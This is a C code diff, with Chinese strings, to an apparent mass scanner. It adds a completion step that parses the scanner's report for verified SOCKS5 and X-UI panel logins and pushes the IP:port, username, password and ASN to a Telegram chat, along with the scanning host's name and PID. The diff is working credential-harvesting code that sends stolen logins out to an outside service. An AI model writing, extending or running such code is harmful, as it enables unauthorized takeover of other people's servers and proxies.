@@ -756,6 +756,181 @@ static int should_push_verified_now(uint64_t total_verified) {
     return (total_verified % (uint64_t)threshold) == 0;
 }
 
+static const char *mode_report_label(int mode) {
+    if (mode == MODE_S5) return "S5";
+    if (mode == MODE_XUI) return "XUI";
+    if (mode == MODE_DEEP) return "混合";
+    if (mode == MODE_VERIFY) return "验真";
+    return "未知";
+}
+
+static void append_server_marker(char *buf, size_t cap) {
+    if (!buf || cap == 0) return;
+    char host[128] = "unknown";
+#ifdef _WIN32
+    DWORD sz = (DWORD)(sizeof(host) - 1);
+    if (GetComputerNameA(host, &sz) == 0) {
+        snprintf(host, sizeof(host), "unknown");
+    }
+#else
+    if (gethostname(host, sizeof(host) - 1) != 0) {
+        snprintf(host, sizeof(host), "unknown");
+    }
+#endif
+    host[sizeof(host) - 1] = '\0';
+    size_t n = strlen(buf);
+    snprintf(buf + n, (n < cap) ? cap - n : 0,
+             "\n\n服务器:%s | PID:%d", host, (int)g_state.pid);
+}
+
+static void format_verified_from_report_line(const char *line, char *out, size_t out_sz) {
+    if (!out || out_sz == 0) return;
+    out[0] = '\0';
+    if (!line) {
+        snprintf(out, out_sz, "-");
+        return;
+    }
+
+    char ip_port[64] = "-";
+    char user[128] = "-";
+    char pass[128] = "-";
+    char asn[32] = "-";
+
+    const char *p = line;
+    while (*p) {
+        unsigned a, b, c, d, port;
+        if (sscanf(p, "%u.%u.%u.%u:%u", &a, &b, &c, &d, &port) == 5) {
+            if (a <= 255 && b <= 255 && c <= 255 && d <= 255 && port <= 65535) {
+                snprintf(ip_port, sizeof(ip_port), "%u.%u.%u.%u:%u", a, b, c, d, port);
+                break;
+            }
+        }
+        p++;
+    }
+
+    const char *u = strstr(line, "账号:");
+    if (u) {
+        u += 5;
+        size_t i = 0;
+        while (u[i] && u[i] != '|' && !isspace((unsigned char)u[i]) && i + 1 < sizeof(user)) {
+            user[i] = u[i];
+            i++;
+        }
+        user[i] = '\0';
+    }
+
+    const char *pw = strstr(line, "密码:");
+    if (pw) {
+        pw += 5;
+        size_t i = 0;
+        while (pw[i] && pw[i] != '|' && !isspace((unsigned char)pw[i]) && i + 1 < sizeof(pass)) {
+            pass[i] = pw[i];
+            i++;
+        }
+        pass[i] = '\0';
+    }
+
+    const char *ap = strstr(line, "AS");
+    if (ap) {
+        size_t i = 0;
+        asn[i++] = 'A';
+        asn[i++] = 'S';
+        ap += 2;
+        while (*ap && isdigit((unsigned char)*ap) && i + 1 < sizeof(asn)) {
+            asn[i++] = *ap++;
+        }
+        asn[i] = '\0';
+        if (i <= 2) snprintf(asn, sizeof(asn), "-");
+    }
+
+    if (strchr(user, ':') && strchr(pass, ':') && strcmp(user, pass) == 0) {
+        snprintf(out, out_sz, "%s:%s %s", ip_port, user, asn);
+    } else {
+        snprintf(out, out_sz, "%s:%s:%s %s", ip_port, user, pass, asn);
+    }
+}
+
+static void send_completion_verified_report(void) {
+    if (!g_config.telegram_token[0] || !g_config.telegram_chat_id[0]) {
+        printf("[TG] 完成推送已跳过: token/chat_id 未配置\n");
+        return;
+    }
+
+    char path[MAX_PATH_LENGTH];
+    if (g_config.report_file[0]) {
+        snprintf(path, sizeof(path), "%s", g_config.report_file);
+    } else {
+        snprintf(path, sizeof(path), "%s/audit_report.log", g_config.base_dir);
+    }
+    char **lines = NULL;
+    size_t lc = 0;
+    if (file_read_lines(path, &lines, &lc) != 0 || !lines || lc == 0) {
+        char msg[768];
+        snprintf(msg, sizeof(msg), "验真完成 | 模式:%s | 条数:0\n暂无验真数据", mode_report_label(g_state.mode));
+        append_server_marker(msg, sizeof(msg));
+        send_telegram_message(g_config.telegram_token, g_config.telegram_chat_id, msg);
+        if (lines) {
+            for (size_t i = 0; i < lc; i++) free(lines[i]);
+            free(lines);
+        }
+        return;
+    }
+
+    uint64_t verified = 0;
+    for (size_t i = 0; i < lc; i++) {
+        const char *s = lines[i] ? lines[i] : "";
+        if (strstr(s, "[XUI_VERIFIED]") || strstr(s, "[S5_VERIFIED]")) verified++;
+    }
+
+    char summary[512];
+    snprintf(summary, sizeof(summary),
+             "验真完成 | 模式:%s | 条数:%llu",
+             mode_report_label(g_state.mode),
+             (unsigned long long)verified);
+
+    char chunk[3600];
+    snprintf(chunk, sizeof(chunk), "%s", summary);
+    int sent_any = 0;
+
+    for (size_t i = 0; i < lc; i++) {
+        const char *s = lines[i] ? lines[i] : "";
+        if (!(strstr(s, "[XUI_VERIFIED]") || strstr(s, "[S5_VERIFIED]"))) continue;
+
+        char one[256];
+        format_verified_from_report_line(s, one, sizeof(one));
+
+        size_t need = strlen(chunk) + strlen(one) + 1;
+        if (need >= sizeof(chunk) - 64) {
+            append_server_marker(chunk, sizeof(chunk));
+            send_telegram_message(g_config.telegram_token, g_config.telegram_chat_id, chunk);
+            sent_any = 1;
+            snprintf(chunk, sizeof(chunk), "%s", one);
+            continue;
+        }
+
+        if (strlen(chunk) > 0) {
+            strncat(chunk, "\n", sizeof(chunk) - strlen(chunk) - 1);
+        }
+        strncat(chunk, one, sizeof(chunk) - strlen(chunk) - 1);
+    }
+
+    if (verified > 0 && strlen(chunk) > 0) {
+        append_server_marker(chunk, sizeof(chunk));
+        send_telegram_message(g_config.telegram_token, g_config.telegram_chat_id, chunk);
+        sent_any = 1;
+    }
+
+    if (!sent_any && verified == 0) {
+        char none_msg[512];
+        snprintf(none_msg, sizeof(none_msg), "%s\n暂无验真数据", summary);
+        append_server_marker(none_msg, sizeof(none_msg));
+        send_telegram_message(g_config.telegram_token, g_config.telegram_chat_id, none_msg);
+    }
+
+    for (size_t i = 0; i < lc; i++) free(lines[i]);
+    free(lines);
+}
+
 static void format_compact_verified_line(const char *ip, uint16_t port,
                                          const char *user, const char *pass,
                                          const char *asn_in,
@@ -1964,6 +2139,10 @@ void scanner_start_streaming(const char *targets_file,
         final_status = "completed_skipped";
     }
     write_scan_progress(&feed_ctx, final_status);
+
+    if (strcmp(final_status, "completed") == 0 || strcmp(final_status, "completed_skipped") == 0) {
+        send_completion_verified_report();
+    }
 
     if (feed_ctx.skipped_resume > 0 || feed_ctx.skipped_history > 0) {
         printf("跳过统计 -> resume:%d history:%d\n", feed_ctx.skipped_resume, feed_ctx.skipped_history);
